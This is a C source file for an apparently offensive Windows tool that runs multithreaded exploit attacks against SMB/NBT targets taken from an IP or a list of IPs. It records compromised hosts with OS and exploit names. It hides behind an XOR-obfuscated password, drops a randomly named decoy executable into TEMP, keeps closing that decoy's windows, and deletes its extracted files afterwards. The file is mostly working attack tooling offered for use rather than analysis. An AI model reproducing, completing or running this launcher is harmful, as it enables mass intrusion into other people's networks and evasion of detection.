#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <conio.h>
#include <windows.h>

#include "global.h"
#include "attack.h"
#include "enc_res/dep_lib.h"
#include "enc_res/dummy.h"
#include "utils/ex_string.h"
#include "utils/ipaddr.h"
#include "utils/encode.h"

#define RETRY_COUNT 3

char gl_Work_Dir[MAX_PATH];
int gl_Threads_Num = 0;
char *pgl_Succ_List = NULL;
CRITICAL_SECTION gl_Thread_Mutex;
CRITICAL_SECTION gl_Add_Mutex;

extern char *pgl_Dummy_Path;
char gl_Dummy_Name[MAX_PATH];
char gl_Self_Name[MAX_PATH];
char gl_Password[1024];
char *gl_encPasswd = "\xd3\xd0\xd0\xd0\xd1\xd1\xd7\xc6\xa7\xc4";

int create_dummy_proc()
{
    char tmpDir[MAX_PATH];
    char *pFileName = NULL;
    ENC_RES_DESC resDesc;
    FILE *dummyFile = NULL;

    memset(tmpDir, 0x00, sizeof(tmpDir));
    memset(&resDesc, 0x00, sizeof(resDesc));
    memset(gl_Dummy_Name, 0x00, sizeof(gl_Dummy_Name));

    strcat(tmpDir, getenv("TEMP"));
    if(strlen(tmpDir) > 0)
    {
        strcat(tmpDir, "\\");
    }
    pFileName = gen_random_string(10);
    if(pFileName == NULL)
    {
        pgl_Dummy_Path = NULL;
        //strcat(gl_Dummy_Name, gl_Self_Name);
    }
    else
    {
        strcat(gl_Dummy_Name, pFileName);
        free(pFileName);
        pgl_Dummy_Path = (char *)malloc(strlen(tmpDir) + strlen(gl_Dummy_Name) + 1);
        if(pgl_Dummy_Path == NULL)
            return -1;
        memset(pgl_Dummy_Path, 0x00, strlen(tmpDir) + strlen(gl_Dummy_Name) + 1);
        sprintf(pgl_Dummy_Path, "%s%s", tmpDir, gl_Dummy_Name);

        //创建临时傀儡程序
        resDesc = get_dummy();
        if(resDesc.status != 0)
        {
            pgl_Dummy_Path = NULL;
            memset(gl_Dummy_Name, 0x00, sizeof(gl_Dummy_Name));
            return -1;
        }
        dummyFile = fopen(pgl_Dummy_Path, "wb");
        if(dummyFile == NULL)
        {
            pgl_Dummy_Path = NULL;
            memset(gl_Dummy_Name, 0x00, sizeof(gl_Dummy_Name));
            return -1;
        }
        if(fwrite(resDesc.pBufAddr, sizeof(char), resDesc.bufSize, dummyFile) <= 0)
        {
            pgl_Dummy_Path = NULL;
            memset(gl_Dummy_Name, 0x00, sizeof(gl_Dummy_Name));
            //strcat(gl_Dummy_Name, gl_Self_Name);
        }
        fclose(dummyFile);
    }

    return 0;
}

BOOL CALLBACK window_handler(HWND hwnd,LPARAM lParam)
{
    char winName[1024];
    char *pNmae = (char *)lParam;

    memset(winName, 0x00, sizeof(winName));

    GetWindowText(hwnd, winName, sizeof(winName) - 1);
    if(strstr(winName, pNmae) != NULL)
    {
        PostMessage(hwnd, WM_CLOSE, NULL, NULL);   //关闭这个窗口
    }

    return TRUE;
}

DWORD WINAPI window_monitor(LPVOID param)
{
    char *pName = (char *)param;

    if(pName == NULL || strlen(pName) <= 0)
        return 0;

    while(1)
    {
        EnumWindows(window_handler, (LPARAM)pName);//枚举所有窗口
        Sleep(1);
    }

    return 0;
}

int add_to_succ_list(TARGET_DESC *pTargetDesc)
{
    const int allocSize = 10240;
    static int totalSize = 0;
    static int usedSize = 0;
    char result[500];

    memset(result, 0x00, sizeof(result));

    if(pgl_Succ_List == NULL)
    {
        pgl_Succ_List = (char *)malloc(allocSize);
        if(pgl_Succ_List == NULL)
            return -1;
        memset(pgl_Succ_List, 0x00, allocSize);
        totalSize = allocSize;
        usedSize = 0;
    }
    else
    {
        if(usedSize + sizeof(result) >= totalSize)
        {
            //扩增内存
            pgl_Succ_List = (char *)realloc(pgl_Succ_List, allocSize + totalSize);
            if(pgl_Succ_List == NULL)
                return -2;
            memset(pgl_Succ_List + totalSize, 0x00, allocSize);
            totalSize += allocSize;
        }
    }

    sprintf(result, "%s\t%s\t%s\t%s\n",
            strlen(pTargetDesc->ip) > 0 ? pTargetDesc->ip : "NULL",
            strlen(pTargetDesc->osVer) > 0 ? pTargetDesc->osVer : "NULL",
            strlen(pTargetDesc->osArch) > 0 ? pTargetDesc->osArch : "NULL",
            strlen(pTargetDesc->expName) > 0 ?  pTargetDesc->expName : "NULL"
            );
    memcpy(pgl_Succ_List + usedSize, result, strlen(result));
    usedSize += strlen(result);

    return 0;
}

DWORD WINAPI attack_thread(LPVOID param)
{
    TARGET_DESC targetDesc = *(TARGET_DESC *)param;
    free(param);

    EnterCriticalSection(&gl_Thread_Mutex);
    gl_Threads_Num++;
    LeaveCriticalSection(&gl_Thread_Mutex);

    chdir(gl_Work_Dir);
    if(attack_target(&targetDesc, RETRY_COUNT) == 0)
    {
        printf("[+] Attack Succeeded!\n");
        EnterCriticalSection(&gl_Add_Mutex);
        add_to_succ_list(&targetDesc);
        LeaveCriticalSection(&gl_Add_Mutex);
    }
    else
    {
        printf("[-] Attack Failed!\n");
    }

    EnterCriticalSection(&gl_Thread_Mutex);
    gl_Threads_Num--;
    LeaveCriticalSection(&gl_Thread_Mutex);

    return 0;
}

int main(int args, char *argv[])
{
    TARGET_DESC targetDesc;
    TARGET_DESC *pTarDesc = NULL;
    char rootDir[MAX_PATH];
    char inputBuf[1024];
    char *pIp = NULL;
    char *pTmp = NULL;
    char *pPasswd = NULL;
    char inPasswd[1024];
    FILE *ipFile = NULL;
    FILE *outFile = NULL;
    int threadNum = 1;
    int idx;

    memset(&targetDesc, 0x00, sizeof(targetDesc));
    memset(rootDir, 0x00, sizeof(rootDir));
    memset(&gl_Thread_Mutex, 0x00, sizeof(gl_Thread_Mutex));
    memset(gl_Work_Dir, 0x00, sizeof(gl_Work_Dir));
    memset(gl_Self_Name, 0x00, sizeof(gl_Self_Name));
    memset(gl_Password, 0x00, sizeof(gl_Password));
    memset(inPasswd, 0x00, sizeof(inPasswd));

    InitializeCriticalSection(&gl_Thread_Mutex);
    InitializeCriticalSection(&gl_Add_Mutex);

    //身份认证
    pPasswd = decrypt_xor(gl_encPasswd, strlen(gl_encPasswd), 0xe7);
    strcat(gl_Password, pPasswd);
    free(pPasswd);
    fflush(stdin);
    printf("Password: ");
    scanf("%s", inPasswd);
    if(strcmp(inPasswd, gl_Password) != 0)
    {
        printf("Wrong password!\n");
        getch();
        return -1;
    }

    pTmp = strrchr(argv[0], '\\');
    if(pTmp != NULL)
    {
        pTmp++;
        strcat(gl_Self_Name, pTmp);
    }
    create_dummy_proc();
    CloseHandle(CreateThread(NULL, 0, window_monitor, (LPVOID)gl_Dummy_Name, 0, NULL));

    if(args == 4 || args == 5)
    {
        if(verify_ip_format(argv[1]) == 0)
        {
            //输入是IP格式
            if(strlen(argv[1]) >= sizeof(targetDesc.ip) || \
                    strlen(argv[2]) > 5 || strlen(argv[3]) != 3)
            {
                printf("Incorrect parameter input.");
                return -2;
            }
            strcat(targetDesc.ip, argv[1]);
        }
        else
        {
            //输入是一个IP列表文件
            ipFile = fopen(argv[1], "rb");
            if(ipFile == NULL)
            {
                printf("[-] Can't open file '%s'.\n", argv[1]);
                return -1;
            }
        }
        strcat(targetDesc.port, argv[2]);
        strcat(targetDesc.proto, upper_str(argv[3]));
        if(strcmp(targetDesc.proto, "SMB") !=0 && \
                strcmp(targetDesc.proto, "NBT") != 0)
        {
            printf("[-] Invalid protocol type.\n");
            return -1;
        }
        if(args == 5)
        {
            threadNum = atoi(argv[4]);
            if(threadNum <= 0)
            {
                printf("[-] Invalid threads param: '%s'.\n", argv[4]);
                return -1;
            }
        }
    }
    else
    {
        printf("[?] Target IP or File: ");
        memset(inputBuf, 0x00, sizeof(inputBuf));
        scanf("%s", inputBuf);
        if(verify_ip_format(inputBuf) == 0)
        {
            strcat(targetDesc.ip, inputBuf);
        }
        else
        {
            ipFile = fopen(inputBuf, "rb");
            if(ipFile == NULL)
            {
                printf("[-] Can't open file '%s'.\n", inputBuf);
                getch();
                return -1;
            }
        }
        printf("[?] Target Port: ");
        scanf("%s", targetDesc.port);
        printf("[?] Protocol[SMB/NBT]: ");
        scanf("%s", targetDesc.proto);
        memcpy(targetDesc.proto, upper_str(targetDesc.proto), \
               strlen(targetDesc.proto));
        if(strcmp(targetDesc.proto, "SMB") !=0 && \
                strcmp(targetDesc.proto, "NBT") != 0)
        {
            printf("[-] Invalid protocol type.\n");
            getch();
            return -1;
        }
        if(ipFile != NULL)
        {
            printf("[?] Threads: ");
            memset(inputBuf, 0x00, sizeof(inputBuf));
            scanf("%s", inputBuf);
            threadNum = atoi(inputBuf);
            if(threadNum <= 0)
            {
                printf("[-] Invalid threads param: '%s'.\n", argv[4]);
                getch();
                return -1;
            }
        }
    }

    if(extract_lib(TEMP_EXTRACT_DIR) != 0)
    {
        return -1;
    }
    strcat(rootDir, getcwd(NULL, NULL));
    sprintf(gl_Work_Dir, "%s\\%s", rootDir, TEMP_EXTRACT_DIR);
    chdir(gl_Work_Dir);
    printf("[+] Current working directory: %s\n", getcwd(NULL, NULL));

    while(1)
    {
        EnterCriticalSection(&gl_Thread_Mutex);
        //printf("Current thread: %d\tMax thread: %d\n", gl_Threads_Num, threadNum);
        if(gl_Threads_Num >= threadNum)
        {
            LeaveCriticalSection(&gl_Thread_Mutex);
            Sleep(1000);
            continue;
        }
        LeaveCriticalSection(&gl_Thread_Mutex);

        pTarDesc = (TARGET_DESC *)malloc(sizeof(TARGET_DESC));
        if(pTarDesc == NULL)
        {
            printf("[-] malloc error.\n");
            continue;
        }
        memset(pTarDesc, 0x00, sizeof(TARGET_DESC));
        *pTarDesc = targetDesc;

        if(ipFile != NULL)
        {
            memset(inputBuf, 0x00, sizeof(inputBuf));
            if(fgets(inputBuf, sizeof(inputBuf) - 1, ipFile) <= 0)
                break;
            while(inputBuf[strlen(inputBuf) - 1] == '\r' ||
                    inputBuf[strlen(inputBuf) - 1] == '\n' ||
                    inputBuf[strlen(inputBuf) - 1] == ' ' ||
                    inputBuf[strlen(inputBuf) - 1] == '\t')
            {
                inputBuf[strlen(inputBuf) - 1] = NULL;
            }
            memset(pTarDesc->ip, 0x00, sizeof(pTarDesc->ip));
            if(verify_ip_format(inputBuf) != 0)
                goto skip;
            strcat(pTarDesc->ip, inputBuf);
        }
        CloseHandle(CreateThread(NULL, 0, attack_thread, (LPVOID)pTarDesc, 0, NULL));
        Sleep(1);
skip:
        if(ipFile == NULL || feof(ipFile))
        {
            if(ipFile != NULL)
            {
                fclose(ipFile);
            }
            break;
        }
    }

    Sleep(2000);
    while(1)
    {
        EnterCriticalSection(&gl_Thread_Mutex);
        if(gl_Threads_Num <= 0)
        {
            LeaveCriticalSection(&gl_Thread_Mutex);
            break;
        }
        LeaveCriticalSection(&gl_Thread_Mutex);
        Sleep(500);
    }

    puts("------------------------------------------------------------------");
    puts("[+] All Done!");
    chdir(rootDir);
    remove(TEMP_EXTRACT_DIR);
    remove(pgl_Dummy_Path);

    if(pgl_Succ_List != NULL && strlen(pgl_Succ_List) > 0)
    {
        puts("\nSuccessed List:");
        outFile = fopen("Successed_List.txt", "wb");
        if(outFile != NULL)
        {
            fputs(pgl_Succ_List, outFile);
            fclose(outFile);
        }
        puts(pgl_Succ_List);
        free(pgl_Succ_List);
    }
    getch();

    return 0;
}
